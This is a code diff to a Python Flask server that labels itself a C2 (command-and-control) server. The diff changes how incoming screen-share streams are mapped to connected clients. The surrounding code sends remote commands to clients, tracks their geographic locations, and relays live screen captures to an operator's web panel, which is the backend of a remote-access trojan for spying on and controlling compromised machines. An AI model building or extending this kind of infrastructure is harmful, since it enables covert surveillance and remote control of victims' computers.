@@ -19,6 +19,8 @@ client_counter = 0
 CLIENT_TIMEOUT = 30  # seconds - remove clients inactive for this long
 HEARTBEAT_INTERVAL = 10  # seconds - check client health every X seconds
 client_locations = {}  # {client_id: {'lat': float, 'lng': float, 'updated_at': timestamp, 'details': {}}}
+# Screen-share stream bindings: {'ip:port': client_id}
+screen_stream_bindings = {}
 
 app = Flask(__name__)
 app.config['SECRET_KEY'] = 'c2-server-secret-key-change-in-production'
@@ -26,6 +28,66 @@ socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
 import struct
 import base64
+
+def _get_client_sort_key(client_id):
+    """Sort client IDs like client_1, client_2 numerically when possible."""
+    try:
+        return int(str(client_id).split('_')[-1])
+    except Exception:
+        return float('inf')
+
+def bind_screenshare_stream(addr):
+    """Bind a screen-share TCP stream to one client for the stream lifetime.
+
+    This avoids ambiguous per-frame mapping when multiple clients share the same IP.
+    """
+    stream_key = f"{addr[0]}:{addr[1]}"
+    ip = addr[0]
+
+    # Reuse existing binding for this stream key if present.
+    existing = screen_stream_bindings.get(stream_key)
+    if existing and existing in clients:
+        return existing
+
+    candidates = [
+        cid for cid, cinfo in clients.items()
+        if cinfo.get('addr') and cinfo['addr'][0] == ip
+    ]
+    if not candidates:
+        return None
+
+    # Stable ordering so list-to-stream mapping does not flip unexpectedly.
+    candidates.sort(key=_get_client_sort_key)
+
+    assigned_for_ip = {
+        cid for key, cid in screen_stream_bindings.items()
+        if key.startswith(f"{ip}:") and cid in clients
+    }
+
+    chosen = None
+    for cid in candidates:
+        if cid not in assigned_for_ip:
+            chosen = cid
+            break
+
+    # Fallback if all candidates already have a stream bound.
+    if chosen is None:
+        chosen = candidates[0]
+
+    screen_stream_bindings[stream_key] = chosen
+    return chosen
+
+def unbind_screenshare_stream(addr):
+    """Remove screen-share stream binding for a disconnected stream."""
+    stream_key = f"{addr[0]}:{addr[1]}"
+    if stream_key in screen_stream_bindings:
+        del screen_stream_bindings[stream_key]
+
+def remove_client_bindings(client_id):
+    """Drop any screen-share bindings pointing at a removed client."""
+    stale_keys = [key for key, cid in screen_stream_bindings.items() if cid == client_id]
+    for key in stale_keys:
+        del screen_stream_bindings[key]
 
 class ScreenShareServerThread(threading.Thread):
     def __init__(self):
@@ -66,6 +128,11 @@ class ScreenShareServerThread(threading.Thread):
         logger = logging.getLogger("ScreenShare")
         logger.info(f"[*] Screen share connected from {addr[0]}:{addr[1]}")
         client.settimeout(None) # Prevents inheriting the 1.0 timeout from listening socket
+        stream_client_id = bind_screenshare_stream(addr)
+        if stream_client_id:
+            logger.info(f"[*] Screen share stream {addr[0]}:{addr[1]} bound to {stream_client_id}")
+        else:
+            logger.warning(f"[!] No matching C2 client found for screen stream {addr[0]}:{addr[1]}")
         try:
             while server_running:
                 def recvall(sock, n):
@@ -96,21 +163,15 @@ class ScreenShareServerThread(threading.Thread):
 
                 # Emit frame as base64 to all connected clients (can namespace or put room if wanted, using namespace='/')
                 b64_frame = base64.b64encode(jpeg_data).decode('utf-8')
-                
-                # Match IP address to client ID
-                client_id = None
-                for cid, cinfo in clients.items():
-                    if cinfo.get('addr') and cinfo['addr'][0] == addr[0]:
-                        client_id = cid
-                        break
 
                 # Commenting out the per-frame print to avoid spam, just logging connections and errors
                 # logger.info(f"[*] Emitting screen frame to web clients ({len(b64_frame)} bytes)")
-                socketio.emit('screen_frame', {'client_id': client_id, 'frame': b64_frame}, namespace='/')
+                socketio.emit('screen_frame', {'client_id': stream_client_id, 'frame': b64_frame}, namespace='/')
         except Exception as e:
             logger.error(f"[!] Screen share client error: {e}")
         finally:
             logger.info(f"[*] Screen share disconnected from {addr[0]}:{addr[1]}")
+            unbind_screenshare_stream(addr)
             client.close()
 
 class C2ServerThread(threading.Thread):
@@ -268,6 +329,7 @@ def send_command_to_client(client_id, command, save_path=None):
 
         if command == "exit":
             client_socket.close()
+            remove_client_bindings(client_id)
             del clients[client_id]
             socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
             return {'success': True, 'response': 'Client disconnected'}
@@ -376,6 +438,7 @@ def send_command_to_client(client_id, command, save_path=None):
                 clients[client_id]['socket'].close()
             except:
                 pass
+            remove_client_bindings(client_id)
             del clients[client_id]
             socketio.emit('client_disconnected', {'client_id': client_id}, namespace='/')
         return {'success': False, 'error': f'Client error: {str(e)}'}
@@ -670,6 +733,7 @@ def cleanup_clients():
             if not response or "pong" not in response:
                 # No valid response
                 sock.close()
+                remove_client_bindings(client_id)
                 del clients[client_id]
                 removed.append(client_id)
                 socketio.emit('client_disconnected', {'client_id': client_id, 'reason': 'manual_cleanup'}, namespace='/')
@@ -684,6 +748,7 @@ def cleanup_clients():
                 clients[client_id]['socket'].close()
             except:
                 pass
+            remove_client_bindings(client_id)
             del clients[client_id]
             removed.append(client_id)
             socketio.emit('client_disconnected', {'client_id': client_id, 'reason': 'manual_cleanup'}, namespace='/')
